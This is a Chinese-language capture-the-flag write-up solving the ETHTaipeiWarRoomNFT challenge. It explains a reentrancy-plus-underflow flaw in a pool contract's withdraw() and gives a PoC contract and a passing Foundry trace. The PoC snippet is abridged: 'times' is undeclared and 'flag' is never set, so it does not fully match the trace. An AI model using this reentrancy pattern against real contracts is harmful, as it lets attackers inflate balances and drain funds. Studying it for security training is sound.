## ETHTaipeiWarRoomNFT

在这个挑战中，用户需要通过存入指定的 NFT 来获得 USDT，并且最终要达到超过 1000 个 USDT 的余额。Pool 合约继承 ERC20，并且提供了 deposit() 和 withdraw() 函数，用于存入和提取 NFT，每次存入 NFT，用户的 USDT 余额会增加 1 个，每次提取 NFT，用户的余额会减少 1 个。

起初，你会有 1 个 NFT。  
``` solidity
function setup() external override {
  challenger = msg.sender;
  nft = new WarRoomNFT();
  pool = new Pool(address(nft));
  tokenId = nft.mint(challenger);
}
```

最终过关条件是在 Pool 池合约中记录的代币余额大于 1000 ether。  
``` solidity
function isSolved(address user) external view returns (bool) {
    return _balances[user] > 1000 ether;
}
```

## 题解
首先，合约编译的版本为 `pragma solidity ^0.7.0;` 那么可以考虑到溢出问题。

只有在 `withdraw` 函数中，对余额做了减法，并且没有遵循“检查-效果-交互”的最佳实践。`withdraw` 函数在更新状态变量 `_balances` 和 `_userDeposits` 之前调用了外部合约，这可能导致重入攻击的发生。由于余额的更新是在转移 NFT 之后执行的，我们可以在状态更新前重新调用 `withdraw` 函数，导致用户的余额出现下溢。

``` solidity
function withdraw(uint256 tokenId) external {
    require(_userDeposits[msg.sender][tokenId], "Should be owner.");
    require(_balances[msg.sender] > 0, "Should have balance.");

    IERC721(NFTCollateral).safeTransferFrom(address(this), msg.sender, tokenId);
    _balances[msg.sender] -= 1 ether;
    delete _userDeposits[msg.sender][tokenId];
}
```

``` solidity
function _safeTransfer(address from, address to, uint256 tokenId, bytes memory _data) internal virtual {
    _transfer(from, to, tokenId);
    require(_checkOnERC721Received(from, to, tokenId, _data), "ERC721: transfer to non ERC721Receiver implementer");
}

function _checkOnERC721Received(address from, address to, uint256 tokenId, bytes memory _data)
    private returns (bool)
{
    if (!to.isContract()) {
        return true;
    }
    bytes memory returndata = to.functionCall(abi.encodeWithSelector(
        IERC721Receiver(to).onERC721Received.selector,
        _msgSender(),
        from,
        tokenId,
        _data
    ), "ERC721: transfer to non ERC721Receiver implementer");
    bytes4 retval = abi.decode(returndata, (bytes4));
    return (retval == _ERC721_RECEIVED);
}
```

由于 `safeTransferFrom` 在第一次调用后已经将 NFT 转移出合约，因此不能直接在回调函数内再次调用 `withdraw`，不然在转移 NFT 那步会失败。所以，需要手动将 NFT 再次存入合约，再调用 `withdraw` 从而再次减少余额。

POC: 
```
bool public flag;

function testExploit() public {
    nft = base.nft();
    pool = base.pool();
    uint256 tokenId = base.tokenId();
    nft.approve(address(pool), tokenId);
    pool.deposit(tokenId);
    pool.withdraw(tokenId);
    base.solve();
    assertTrue(base.isSolved());
}

function onERC721Received(address, address, uint256 tokenId, bytes memory) external returns (bytes4) {
    if (!flag) {
        times++;
        nft.safeTransferFrom(address(this), address(pool), 1);
        pool.withdraw(tokenId);
    }
    return this.onERC721Received.selector;
}
```

```
[PASS] testExploit() (gas: 336603)
Traces:
  [426019] PoolTest::testExploit()
    ├─ [2382] PoolBase::nft() [staticcall]
    │   └─ ← [Return] WarRoomNFT: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
    ├─ [2338] PoolBase::pool() [staticcall]
    │   └─ ← [Return] Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]
    ├─ [2321] PoolBase::tokenId() [staticcall]
    │   └─ ← [Return] 1
    ├─ [32127] WarRoomNFT::approve(Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 1)
    │   ├─ emit Approval(owner: PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], approved: Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], tokenId: 1)
    │   └─ ← [Stop] 
    ├─ [141780] Pool::deposit(1)
    │   ├─ [94538] WarRoomNFT::transferFrom(PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 1)
    │   │   ├─ emit Approval(owner: PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], approved: 0x0000000000000000000000000000000000000000, tokenId: 1)
    │   │   ├─ emit Transfer(from: PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], tokenId: 1)
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [160466] Pool::withdraw(1)
    │   ├─ [138690] WarRoomNFT::safeTransferFrom(Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   ├─ emit Approval(owner: Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], approved: 0x0000000000000000000000000000000000000000, tokenId: 1)
    │   │   ├─ emit Transfer(from: Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], to: PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1)
    │   │   ├─ [125428] PoolTest::onERC721Received(Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 1, 0x)
    │   │   │   ├─ [84901] WarRoomNFT::safeTransferFrom(PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 1)
    │   │   │   │   ├─ emit Approval(owner: PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], approved: 0x0000000000000000000000000000000000000000, tokenId: 1)
    │   │   │   │   ├─ emit Transfer(from: PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], tokenId: 1)
    │   │   │   │   ├─ [739] Pool::onERC721Received(PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1, 0x)
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [16174] Pool::withdraw(1)
    │   │   │   │   ├─ [14298] WarRoomNFT::safeTransferFrom(Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   │   │   │   ├─ emit Approval(owner: Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], approved: 0x0000000000000000000000000000000000000000, tokenId: 1)
    │   │   │   │   │   ├─ emit Transfer(from: Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], to: PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1)
    │   │   │   │   │   ├─ [1036] PoolTest::onERC721Received(Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], Pool: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 1, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] 0x150b7a02
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [25461] PoolBase::solve()
    │   ├─ [499] Pool::isSolved(PoolTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [311] PoolBase::isSolved() [staticcall]
    │   └─ ← [Return] true
    └─ ← [Stop] 
```
